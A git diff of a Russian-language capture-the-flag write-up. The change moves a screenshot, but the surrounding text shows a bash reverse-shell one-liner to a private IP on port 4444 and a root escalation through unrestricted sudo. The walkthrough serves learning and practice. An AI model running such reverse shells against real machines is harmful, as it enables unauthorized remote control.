@@ -58,6 +58,8 @@ sudo -l
 ```
 `whoami` показал мне что я `www-data`, `pwd` показал мне что я в `/var/www/html`, а `sudo -l` показал мне, что у меня есть доступ использовать все команды без ввода пароля `(ALL) NOPASSWD: ALL`
 
+![Sudo list](images/sudoList.jpg)
+
 В первую очередь я решил получить **reverse-shell**
 
 ---
@@ -85,8 +87,6 @@ bash -c 'bash -i >& /dev/tcp/192.168.166.222/4444 0>&1'
 ```bash
 sudo su
 ```
-
-![Sudo list](images/sudoList.jpg)
 
 И у меня получилось, я проверил через whoami, и да я был root. Теперь я занялся поиском флагов,
 в первую очередь начал искать флаги в /var/www/html с помощью 
